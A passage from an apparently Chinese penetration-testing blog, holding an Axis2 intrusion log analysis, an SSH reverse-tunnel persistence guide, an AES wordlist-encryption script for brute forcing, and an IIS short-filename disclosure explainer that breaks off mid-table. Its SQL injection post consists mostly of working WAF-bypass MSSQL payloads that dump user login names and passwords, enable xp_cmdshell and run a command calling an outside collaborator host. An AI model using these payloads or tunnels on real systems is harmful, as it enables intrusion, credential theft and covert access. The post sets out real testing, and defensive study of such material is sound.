<h3 id="WEB日志分析"><a href="#WEB日志分析" class="headerlink" title="WEB日志分析"></a>WEB日志分析</h3><h4 id="确认有哪些恶意文件？"><a href="#确认有哪些恶意文件？" class="headerlink" title="确认有哪些恶意文件？"></a>确认有哪些恶意文件？</h4><ol>
<li>通过find命令查找7日、30日之内变更、新增的文件。</li>
<li>通过河马、D盾对整个web目录进行扫描。</li>
<li>对筛选出来的文件再次进行人工审查，初步确认存在3个恶意文件，分别为 skin.jsp（reGeorg）、help.jsp（reGeorg）、j2ee.jsp（冰蝎）。</li>
</ol>
<h4 id="确认有多少个IP访问过恶意文件？"><a href="#确认有多少个IP访问过恶意文件？" class="headerlink" title="确认有多少个IP访问过恶意文件？"></a>确认有多少个IP访问过恶意文件？</h4><p><code>grep -ie &quot;skin.jsp\|help.jsp\|j2ee.jsp&quot; localhost_access_log* | awk &#39;&#123;print $1&#125;&#39; | sort | uniq -c</code> ，发现共15个IP访问过恶意文件。</p>
<table>
<thead>
<tr>
<th>序号</th>
<th>IP</th>
</tr>
</thead>
<tbody><tr>
<td>1</td>
<td>112.96.67.7</td>
</tr>
<tr>
<td>2</td>
<td>13.234.116.183</td>
</tr>
<tr>
<td>3</td>
<td>58.62.206.235</td>
</tr>
<tr>
<td>4</td>
<td>58.62.206.249</td>
</tr>
<tr>
<td>5</td>
<td>112.96.195.23</td>
</tr>
<tr>
<td>6</td>
<td>120.235.159.163</td>
</tr>
<tr>
<td>7</td>
<td>120.239.76.89</td>
</tr>
<tr>
<td>8</td>
<td>223.104.66.68</td>
</tr>
<tr>
<td>9</td>
<td>112.96.193.140</td>
</tr>
<tr>
<td>10</td>
<td>120.235.159.189</td>
</tr>
<tr>
<td>11</td>
<td>120.235.159.246</td>
</tr>
<tr>
<td>12</td>
<td>223.104.63.106</td>
</tr>
<tr>
<td>13</td>
<td>45.66.134.61</td>
</tr>
<tr>
<td>14</td>
<td>112.96.173.19</td>
</tr>
<tr>
<td>15</td>
<td>117.136.41.37</td>
</tr>
</tbody></table>
<h4 id="确认这些IP中第一个访问系统的IP是什么？"><a href="#确认这些IP中第一个访问系统的IP是什么？" class="headerlink" title="确认这些IP中第一个访问系统的IP是什么？"></a>确认这些IP中第一个访问系统的IP是什么？</h4><p><code>grep -m1  &quot;112.96.67.7/|13.234.116.183.....&quot;   localhost_access_log*</code>，发现58.62.206.249为第一个访问系统的IP，访问时间为：11&#x2F;May&#x2F;2021:12:15:23</p>
<h4 id="确认这些IP访问过什么文件，发送过什么请求包？"><a href="#确认这些IP访问过什么文件，发送过什么请求包？" class="headerlink" title="确认这些IP访问过什么文件，发送过什么请求包？"></a>确认这些IP访问过什么文件，发送过什么请求包？</h4><ol>
<li><code>grep -ie &quot;IP地址.*\s200\s.*&quot; localhost_access_log* | awk &#39;&#123;print $7&#125;&#39; |awk -F &#39;?&#39; &#39;&#123;print $1&#125;&#39; | sort | uniq -c | sort -rnk 1</code> ，查询成功访问的uri资源，发现对含有AxisInvoker的路径访问频繁; </li>
<li><code>grep -ie &quot;IP地址.*AxisInvoker.*\s200\s.*&quot; localhost_access_log* | awk &#39;&#123;print $7&#125;&#39; | sort | uniq -c | sort -rnk 1</code> ，排查 AxisInvoker，检查方法参数，分析攻击者操作，发现该文件对应7天内新增的 AxisInvoker.aar 包，是后门程序，攻击者通过该后门程序写入skin.jsp（reGeorg）、help.jsp（reGeorg）、j2ee.jsp（冰蝎），反弹shell等。</li>
</ol>
<h4 id="确认什么时候第一次获取控制权？"><a href="#确认什么时候第一次获取控制权？" class="headerlink" title="确认什么时候第一次获取控制权？"></a>确认什么时候第一次获取控制权？</h4><ol>
<li><code>grep -m1 -c10 -ie &quot;AxisInvoker&quot;  localhost_access_log*</code>，发现第一次出现 AxisInvoker 记录的 IP：<code>58.62.206.249</code>，出现时间：<code>11/May/2021:13:39:08</code>，对上一条日志记录为 <code>/r1/axis2-admin/upload</code></li>
<li>检查第一次访问系统时间：<code>11/May/2021:12:15:23</code> 与第一次出现 AxisInvoker 记录：<code>11/May/2021:13:39:08</code> 之间的日志，未发现其他异常的情况。</li>
<li>综上，判断攻击者登陆了 axis2 后台，并通过后台部署AxisInvoker.aar 包，获取控制权限，初次获取控制权限的时间为：<code>11/May/2021:13:39:08</code>。</li>
</ol>
<h2 id="分析结果"><a href="#分析结果" class="headerlink" title="分析结果"></a>分析结果</h2><p>经分析整理，本次信息安全事件是由 axis 管理后台存在弱口令漏洞导致。攻击者通过 axis 弱口令登录管理后台，在管理后台部署恶意aar包获取控制权限。后续则通过上传冰蝎木马，reGeorg 流量代理工具等进一步控制服务器并开展横向渗透攻击。
 </p>
]]></content>
  </entry>
  <entry>
    <title>内网穿透之ssh反向隧道</title>
    <url>/2022/03/19/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F%E4%B9%8Bssh%E5%8F%8D%E5%90%91%E9%9A%A7%E9%81%93/</url>
    <content><![CDATA[<h1 id="ssh反向隧道"><a href="#ssh反向隧道" class="headerlink" title="ssh反向隧道"></a>ssh反向隧道</h1><h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h2><p>一种简单的内网穿透方式</p>
<h2 id="场景示例"><a href="#场景示例" class="headerlink" title="场景示例"></a>场景示例</h2><p><img src="https://raw.githubusercontents.com/sing3r/image/main/hexoImage473fb8ec7ad265461809000af8c0d6b3402d6d2d6db7573a4694e7980c08b640.png"></p>
<h2 id="设置"><a href="#设置" class="headerlink" title="设置"></a>设置</h2><h3 id="VPS"><a href="#VPS" class="headerlink" title="VPS"></a>VPS</h3><ol>
<li>&#x2F;etc&#x2F;ssh&#x2F;sshd_config，GatewayPorts参数值为yes</li>
<li>systemctl restart sshd.service，重启ssh服务</li>
</ol>
<h3 id="内网电脑"><a href="#内网电脑" class="headerlink" title="内网电脑"></a>内网电脑</h3><p><strong>简单建立ssh反向隧道</strong> <br>执行命令：<code>ssh -ngfNTR &lt;VPS监听端口&gt;:&lt;内网主机IP&gt;:&lt;内网主机需要转发到VPS的端口&gt; root@&lt;VPS地址&gt; -o ServerAliveInterval=300</code>。例如：<code>ssh -ngfNTR 80:127.0..0.1:22 root@150.158.xx.xx -o ServerAliveInterval=300</code></p>
<ul>
<li>-f 表示后台执行</li>
<li>-N 表示不执行任何命令</li>
<li>-R 建立反向隧道</li>
<li>1222 A机用来外面ssh的监听端口</li>
<li>-o ServerAliveInterval&#x3D;300 的意思是让ssh client每300秒就给server发个心跳,以免链路被RST. </li>
<li>-f Requests ssh to go to background just before command execution. 让该命令后台运行 . </li>
<li>-n Redirects stdin from &#x2F;dev&#x2F;null (actually, prevents reading from stdin). </li>
<li>-N Do not execute a remote command. 不执行远程命令 . </li>
<li>-T Disable pseudo-tty allocation. 不占用 shell . </li>
<li>-g Allows remote hosts to connect to local forwarded ports.</li>
</ul>
<p><strong>持久建立ssh反向隧道-1</strong> </p>
<ol>
<li>安装autossh；</li>
<li>新建<code>/opt/sshPortMapping.sh</code>，赋予644权限，内容为:<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">!/bin/sh</span></span><br><span class="line">autossh -M 7890 -NR 80:127.0.0.1:22 root@150.158.xx.xx -i ~/.ssh/id_rsa</span><br></pre></td></tr></table></figure></li>
<li>新建开机自启动服务文件 <code>/usr/lib/systemd/system/autosshd.service</code>：<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[Unit]</span><br><span class="line">Description=Auto SSH Tunnel</span><br><span class="line">After=network-online.target</span><br><span class="line">StartLimitInterval=10</span><br><span class="line">[Service]</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">User=root</span></span><br><span class="line">Type=simple</span><br><span class="line">ExecStart=/bin/bash /opt/sshPortMapping.sh</span><br><span class="line">ExecReload=/bin/kill -HUP $MAINPID</span><br><span class="line">KillMode=process</span><br><span class="line">Restart=always</span><br><span class="line">RestartSec=5</span><br><span class="line">[Install]</span><br><span class="line">WantedBy=multi-user.target</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">WantedBy=graphical.target</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">WantedBy=default.target</span></span><br></pre></td></tr></table></figure></li>
<li>设置为开机自启动服务：<code>systemctl enable autosshd.service</code></li>
<li>启动服务：<code>systemctl start autosshd </code></li>
</ol>
<blockquote>
<p><strong>PS：</strong> 因为autossh需要交互输入vps的密码，存在不便。所以使用证书登陆，autossh通过-i指定证书文件进行免密登陆，所以“持久建立ssh反向隧道”还需要在内网主机生成证书，并将公钥上传vps。<br>   6. 至此，其他机器就可以<code>ssh root@150.158.84.84 -p 80</code>访问内网主机。 </p>
</blockquote>
<p><strong>持久建立ssh反向隧道-2</strong></p>
<p>将<code>/opt/sshPortMapping.sh</code>代码替换为以下，其余同“持久建立ssh反向隧道-1”操作一样：<br><code>autossh -M 7890 -fN -o &quot;PubkeyAuthentication=yes&quot; -o &quot;StrictHostKeyChecking=false&quot; -o &quot;PasswordAuthentication=no&quot; -o &quot;ServerAliveInterval 60&quot; -o &quot;ServerAliveCountMax 3&quot; -R 80:127.0.0.1:22 root@150.158.84.84 -i ~/.ssh/id_rsa</code></p>
<h2 id="基于ssh反向隧道建立socket代理"><a href="#基于ssh反向隧道建立socket代理" class="headerlink" title="基于ssh反向隧道建立socket代理"></a>基于ssh反向隧道建立socket代理</h2><p>通过上面的设置已经可以访问内网主机的ssh端口，基于以上，在其他client主机上执行以下命令：<code>ssh -N -D 127.0.0.1:9999 root@150.158.xx.xx -p 80</code>。接下来就可以将浏览器浏代理设置为<code>socket//127.0.0.1:9999</code>，将内网主机将作为代理服务器。</p>
<h2 id="踩坑"><a href="#踩坑" class="headerlink" title="踩坑"></a>踩坑</h2><ol>
<li>测试中，非root用户无法无法建立转发，原因未明。</li>
</ol>
]]></content>
      <categories>
        <category>内网穿透</category>
      </categories>
      <tags>
        <tag>内网穿透</tag>
        <tag>ssh</tag>
        <tag>代理</tag>
      </tags>
  </entry>
  <entry>
    <title>暴力破解之前端AES加密</title>
    <url>/2022/03/18/%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3%E4%B9%8B%E5%89%8D%E7%AB%AFAES%E5%8A%A0%E5%AF%86/</url>
    <content><![CDATA[<h2 id="0x01-前言"><a href="#0x01-前言" class="headerlink" title="0x01-前言"></a>0x01-前言</h2><p>某次测试中遇到一个信息泄露漏洞。页面提供一个查询功能，用户需要填写两个或三个参数值，且参数值正确才能返回相关信息。在测试中，发现仅需提供一个参数值即可以返回相关信息。如在提供<em><strong>姓名输入框</strong></em>中填入：“吴翠”，即可返回“吴翠”的相关信息。</p>
<p><img src="https://raw.githubusercontents.com/sing3r/image/main/hexoImage20220318120459.png"></p>
<h2 id="0x02-AES加密的参数"><a href="#0x02-AES加密的参数" class="headerlink" title="0x02-AES加密的参数"></a>0x02-AES加密的参数</h2><p>测试过程中，发现参数值经过加密，翻查JS文件，确认是AES加密。<br>一开始的想法是使用 Burpsuite 的 <code>JS Rainbow</code> 插件加载JS文件，自动执行加密函数加密参数值进行爆破，后发现导入字典测试的时候，由于字典内容为中文，会导致加密结果与预期不一致，后端无法解析加密后的数据，导致查询失败。<br>后续尝试使用 <code>BurpCrypto</code>、<code>AES KILLER</code>等 Burpsuite 插件时均与上面情况一样，中文内容加密与预期不一致。估计是由于 Burpsuite 软件自身问题。<br>再后使用 python 写个小程序，将字典加密，将加密结果作为字典导入 Burpsuite 爆破才成功。</p>
<p><img src="https://raw.githubusercontents.com/sing3r/image/main/hexoImage20220318122718.png"></p>
<p><strong>加密小程序源代码</strong></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.Padding <span class="keyword">import</span> pad</span><br><span class="line"></span><br><span class="line"><span class="comment"># 加密函数</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">encrypt</span>(<span class="params">text</span>):</span><br><span class="line">    key = <span class="string">b&#x27;FC5E8DF8BB4A2F78&#x27;</span></span><br><span class="line">    mode = AES.MODE_CBC</span><br><span class="line">    iv = <span class="string">b&#x27;!1@2#3$4%5^6&amp;7*8&#x27;</span></span><br><span class="line">    cryptos = AES.new(key, mode, iv)</span><br><span class="line">    padtext=pad(text,<span class="number">16</span>,style=<span class="string">&#x27;pkcs7&#x27;</span>)</span><br><span class="line">    cipherText=cryptos.encrypt(padtext)</span><br><span class="line">    <span class="keyword">return</span> base64.encodebytes(cipherText)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">r&#x27;500.txt&#x27;</span>,<span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> fs:</span><br><span class="line">        <span class="keyword">for</span> line <span class="keyword">in</span> fs.readlines():</span><br><span class="line">            name = <span class="built_in">bytes</span>(line.strip(),encoding=<span class="string">&#x27;utf8&#x27;</span>)</span><br><span class="line">            e = encrypt(name)</span><br><span class="line">            <span class="built_in">print</span>(<span class="built_in">str</span>(e.strip(), encoding = <span class="string">&quot;utf-8&quot;</span>))</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>渗透测试</category>
      </categories>
      <tags>
        <tag>WEB安全</tag>
        <tag>暴力破解</tag>
        <tag>AES</tag>
      </tags>
  </entry>
  <entry>
    <title>某CDN SQLi注入Bypass</title>
    <url>/2022/03/19/%E6%9F%90CDN-SQLi%E6%B3%A8%E5%85%A5Bypass/</url>
    <content><![CDATA[<h2 id="0x01-前言："><a href="#0x01-前言：" class="headerlink" title="0x01 前言："></a>0x01 前言：</h2><p>某次测试，发现目标存在 SQLi 注入漏洞，站点采用某信服CDN，且提供防护功能。由于无法找到真实IP地址，遂有本次测试。</p>
<h2 id="0x02-Payload"><a href="#0x02-Payload" class="headerlink" title="0x02 Payload"></a>0x02 Payload</h2><p>目标站点信息一览表</p>
<ul>
<li>中间件：IIS</li>
<li>数据库：MSSQL</li>
<li>脚本语言：aspx</li>
</ul>
<h3 id="Payload："><a href="#Payload：" class="headerlink" title="Payload："></a>Payload：</h3><h4 id="绕过-union-selec-常规函数-："><a href="#绕过-union-selec-常规函数-：" class="headerlink" title="绕过 union selec+常规函数 ："></a>绕过 <code>union selec+常规函数</code> ：</h4><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="operator">%</span><span class="string">&#x27;and--^!~%*/%0b%0a1=2 union--^!~%*/%0b/*%0aall select--^!~%*/%0b%0anull,null,null,null,db_name--%0a(),2,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null--</span></span><br></pre></td></tr></table></figure>

<h4 id="绕过-union-select-x-from-x-："><a href="#绕过-union-select-x-from-x-：" class="headerlink" title="绕过 union select x from x ："></a>绕过 <code>union select x from x </code>：</h4><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="operator">%</span><span class="string">&#x27;and--^!~%*/%0b%0a1=2 union--^!~%*/%0b/*%0aall(select--^!~%*/%0b/*%0anull,null,null,null,1,2,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null--^!~%*/%0b/*%0afrom--^!~%*/%0b/*%0ax)--</span></span><br></pre></td></tr></table></figure>

<h4 id="绕过-union-all-select-x-from-x-："><a href="#绕过-union-all-select-x-from-x-：" class="headerlink" title="绕过 union all select x from x ："></a>绕过 <code>union all select x from x</code> ：</h4><p><strong>查表名：</strong></p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="operator">%</span><span class="string">&#x27;and--^!~%*/%0b%0a1=2 union--^!~%*/%0b%0aall(--^!~%*/%0b%0aselect--^!~%*/%0b/*%0anull,null,null,null,name,2,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null--^!~%*/%0b%0afrom--/*^~%%0bx*/%0asysobjects)--</span></span><br></pre></td></tr></table></figure>

<p><strong>查字段名：</strong></p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="operator">%</span><span class="string">&#x27;and--^!~%*/%0b%0a1=2%20union--^!~%*/%0b%0aall(--^!~%*/%0b%0aselect--^!~%*/%0b/*%0anull,null,null,null,COLUMN_NAME,2,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null--^!~%*/%0b%0afrom--/*^~%%0bx*/%0ainformation_schema.COLUMNS where TABLE_NAME=&#x27;</span>sys_User<span class="string">&#x27;)--</span></span><br></pre></td></tr></table></figure>

<p><strong>查数据：</strong></p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="operator">%</span><span class="string">&#x27;and--^!~%*/%0b%0a1=2%20union--^!~%*/%0b%0aall(--^!~%*/%0b%0aselect--^!~%*/%0b/*%0anull,null,null,null,U_LoginName,U_Password ,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null--^!~%*/%0b%0afrom--/*^~%%0bx*/%0asys_User)--</span></span><br></pre></td></tr></table></figure>

<p><strong>开启xp_cmdshell：</strong></p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="operator">%</span><span class="string">&#x27;and--^!~%*/%0b%0a1=2%20union--^!~%*/%0b/*%0aall%20select--^!~%*/%0b%0anull,null,null,null,SERVERPROPERTY--%0a(%27MachineName%27),2,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null;EXEC--^!~%*/%0b%0asp_configure &#x27;</span><span class="keyword">show</span> advanced options<span class="string">&#x27;, 1;RECONFIGURE;EXEC--^!~%*/%0b%0asp_configure &#x27;</span>xp_cmdshell<span class="string">&#x27;, 1;RECONFIGURE;</span></span><br></pre></td></tr></table></figure>

<p><strong>执行ping命令测试：</strong></p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="operator">%</span><span class="string">&#x27;and--^!~%*/%0b%0a1=2%20union--^!~%*/%0b/*%0aall%20select--^!~%*/%0b%0anull,null,null,null,SERVERPROPERTY--%0a(%27MachineName%27),2,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null;exec--^!~%*/%0b%0amaster..xp_cmdshell%20%27ping%20hn81hzwt1rqcgj20qnh50is0drjh76.burpcollaborator.net%27--</span></span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>SQLi</category>
      </categories>
      <tags>
        <tag>SQLi</tag>
        <tag>注入</tag>
        <tag>bypass</tag>
        <tag>CDN</tag>
        <tag>WAF</tag>
      </tags>
  </entry>
  <entry>
    <title>渗透测试之短文件名漏洞</title>
    <url>/2022/03/26/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E7%9F%AD%E6%96%87%E4%BB%B6%E5%90%8D%E6%BC%8F%E6%B4%9E/</url>
    <content><![CDATA[<h1 id="渗透测试之短文件名漏洞"><a href="#渗透测试之短文件名漏洞" class="headerlink" title="渗透测试之短文件名漏洞"></a>渗透测试之短文件名漏洞</h1><h2 id="0x01-前言"><a href="#0x01-前言" class="headerlink" title="0x01-前言"></a>0x01-前言</h2><p>某次测试，使用 dirsearch 对网站目录进行扫描，突然发现一个终端出现一个奇怪的路径： <code>index~1</code> ，且响应码为 200。访问后发现该文件为 index 备份文件，浏览器直接显示文件源码。真奇怪啊，真奇怪。后面百度发现，<code>Apache + Windows</code> 组合，会存在短文件名下载漏洞。参考网上内容，整理合并资料，遂有下文。</p>
<h2 id="0x02-Windows-Apache-x3D-短文件名任意文件下载"><a href="#0x02-Windows-Apache-x3D-短文件名任意文件下载" class="headerlink" title="0x02-Windows + Apache &#x3D; 短文件名任意文件下载"></a>0x02-Windows + Apache &#x3D; 短文件名任意文件下载</h2><p>Windows下采用了短文件名机制，如</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">C:\wooyun12312394944545.txt</span><br></pre></td></tr></table></figure>

<p>可采用如下方式访问</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">C:\wooyun~1.txt</span><br></pre></td></tr></table></figure>

<p>假如web应用程序中存在一个备份文件，文件名是这样的：<code>http://127.0.0.1/admin/databack/sql/metinfo_met_20140202_ixzlfo_1.zip</code>。当目标站点为 windows + apache(影响版本范围不确认，网上说 Apache 服务器默认支持短文件名访问) 的时候，我们就可以通过短文件名的方式直接下载文件：<code>http://127.0.0.1/admin/databack/sql/metinf~1.zip</code></p>
<p><strong>漏洞证明：</strong></p>
<p><img src="https://raw.githubusercontents.com/sing3r/image/main/hexoImage20220324165011.png"></p>
<p><em>PS : IIS 下不允许使用短文件来访问资源，而 Apache 支持短文件名来访问资源，因此上面介绍的任意文件下载只能适应于 windows 系统下的 Apache 搭建的网站中（Tomcat 也不支持使用短文件名来访问资源）。IIS 中虽然不能利用短文件名来访问资源，但是存在 IIS 短文件泄露漏洞，可以利用短文件名来猜测网站目录下的文件和目录名</em></p>
<h2 id="0x03-IIS-短文件名"><a href="#0x03-IIS-短文件名" class="headerlink" title="0x03-IIS 短文件名"></a>0x03-IIS 短文件名</h2><h3 id="IIS短文件漏洞的由来"><a href="#IIS短文件漏洞的由来" class="headerlink" title="IIS短文件漏洞的由来"></a>IIS短文件漏洞的由来</h3><p>Microsoft IIS 短文件&#x2F;文件夹名称信息泄漏最开始由Vulnerability Research Team（漏洞研究团队）的Soroush Dalili在2010年8月1日发现，并于2010年8月3日通知供应商（微软公司）。微软公司分别于2010年12月1日和2011年1月4日给予答复下个版本修复。2012年6月29日，此漏洞公开披露（中危）。</p>
<p>此漏洞实际是由HTTP请求中旧 <code>DOS 8.3</code> 名称约定（SFN）的代字符（<code>〜</code>）波浪号引起的。它允许远程攻击者在Web根目录下公开文件和文件夹名称（不应该可被访问）。攻击者可以找到通常无法从外部直接访问的重要文件，并获取有关应用程序基础结构的信息。</p>
<p>Microsoft IIS 波浪号造成的信息泄露是世界网络范围内最常见的中等风险漏洞。这个问题至少从1990年开始就已经存在，但是已经证明难以发现，难以解决或容易被完全忽略。</p>
<h3 id="IIS短文件漏洞影响范围及危害"><a href="#IIS短文件漏洞影响范围及危害" class="headerlink" title="IIS短文件漏洞影响范围及危害"></a>IIS短文件漏洞影响范围及危害</h3><h4 id="受影响的版本"><a href="#受影响的版本" class="headerlink" title="受影响的版本"></a>受影响的版本</h4><blockquote>
<p>IIS 1.0，Windows NT 3.51<br>IIS 3.0，Windows NT 4.0 Service Pack 2<br>IIS 4.0，Windows NT 4.0选项包<br>IIS 5.0，Windows 2000<br>IIS 5.1，Windows XP Professional和Windows XP Media Center Edition<br>IIS 6.0，Windows Server 2003和Windows XP Professional x64 Edition<br>IIS 7.0，Windows Server 2008和Windows Vista<br>IIS 7.5，Windows 7（远程启用<customErrors>或没有web.config）<br>IIS 7.5，Windows 2008（经典管道模式）<br>IIS 8.0，Windows 8, Windows Server 2012<br>IIS 8.5，Windows 8.1,Windows Server 2012 R2<br>IIS 10.0，Windows 10, Windows Server 2016</p>
</blockquote>
<h4 id="支持方法"><a href="#支持方法" class="headerlink" title="支持方法"></a>支持方法</h4><p>DEBUG、OPTIONS、GET、POST、HEAD、TRACE<br><strong>IIS 7.5(Windows 2008 R2)</strong> 和 <strong>IIS 8.0(Windows 2012)</strong> 过程中，当使用 OPTIONS 来代替 GET 方法时，如果请求中的短文件名是存在的，IIS就会返回一个不一样的错误信息。<strong>IIS 8.0</strong>、<strong>IIS 8.5</strong> 和 <strong>IIS 10.0</strong> 的短文件名称均可以通过OPTIONS和TRACE方法被猜测成功。</p>
<h4 id="危害"><a href="#危害" class="headerlink" title="危害"></a>危害</h4><ol>
<li>利用 <code>~</code> 字符猜解暴露短文件&#x2F;文件夹名（主要危害）</li>
<li>Net Framework 的拒绝服务攻击 （副危害）：<br>据Soroush Dalili在研究表明，攻击者如果在文件夹名称中向发送一个不合法的.Net文件请求，.NeFramework将递归搜索所有的根目录，消耗网站资源进而导致DOS问题。微软认为此危害是可恢复的DOS，将在后续SP版本修改，此处不做探讨研究。</li>
</ol>
<h4 id="特征"><a href="#特征" class="headerlink" title="特征"></a>特征</h4><ol>
<li>只有前六位字符直接显示，后续字符用 ~1 指代。其中数字 1 还可以递增，如果存在多个文件名类似的文件（名称前6位必须相同，且后缀名前3位必须相同）；</li>
<li>后缀名最长只有 3 位，多余的被截断，超过 3 位的长文件会生成短文件名；</li>
<li>所有小写字母均转换成大写字母；</li>
<li>长文件名中含有多个“.”，以文件名最后一个“.”作为短文件名后缀；</li>
<li>长文件名前缀&#x2F;文件夹名字符长度符合 0-9 和 Aa-Zz 范围且需要大于等于 9 位才会生成短文件名，如果包含空格或者其他部分特殊字符，不论长度均会生成短文件。</li>
</ol>
<p>我们可以在启用 .net 的 IIS 下使用GET方法暴力列举短文件名，原因是攻击者使用通配符 <code>*</code> 和 <code>?</code> 发送一个请求到 IIS,当 IIS 接收到一个文件路径中包含 <code>~</code> 请求时，它的反应是不同的，即返回的 HTTP 状态码和错误信息不同。基于这个特点，可以根据 HTTP 的响应区分一个可用或者不可用的文件。如下表所示不同 IIS 版本返回信息的不同：</p>
<p><strong>IIS 5.0 ~ IIS 7.X短文件猜解HTTP响应信息：访问构造的某个存在的短文件名，会返回404；访问构造的某个不存在的短文件名，会返回400。</strong></p>
<table>
<thead>
<tr>
<th>IIS VERSION</th>
<th>URL</th>
<th>Result&#x2F;Error Message</th>
</tr>
</thead>
<tbody><tr>
<td>IIS 6</td>
<td>&#x2F;valid*~1*&#x2F;.aspx</td>
<td>HTTP 404 - File not found</td>
</tr>
<tr>
<td>IIS 6</td>
<td>&#x2F;Invalid*~1*&#x2F;.aspx</td>
<td>HTTP 400 - Bad Request</td>
</tr>
<tr>
<td>IIS 5.X</td>
<td>&#x2F;valid*~1*</td>
<td>HTTP 404 - File not found</td>
</tr>
<tr>
<td>IIS 5.X</td>
<td>&#x2F;Invalid*~1*</td>
<td>HTTP 400 - Bad Request</td>
</tr>
<tr>
<td>IIS 7.X.NET.2(No Error Handling)</td>
<td>&#x2F;valid*~1*&#x2F;</td>
<td>Page contains: “Error Code 0x00000000”</td>
</tr>
<tr>
<td>IIS 7.X.NET.2(No Error Handling)</td>
<td>&#x2F;Invalid*~1*&#x2F;</td>
<td>Page contains: “Error Code 0x80070002”</td>
</tr>
</tbody></table>
<p><strong>IIS 状态码猜解过程：IIS较低版本+ASP.NET 环境下使用GET方法反复循环猜测，直到猜解出短文件名</strong></p>
<table>
<thead>
<tr>
<th>URL</th>
<th>Result</th>
</tr>
</thead>
<tbody><tr>
<td><a href="http://sdl.me//*~1/*/.aspx">http://sdl.me/\*~1\*/.aspx</a></td>
<td>404. Valid: one or more file(s)&#x2F;folder(s) with short name is&#x2F;are available on the server</td>
</tr>
<tr>
<td><a href="http://sdl.me/a*~1*/.aspx">http://sdl.me/a*~1*/.aspx</a></td>
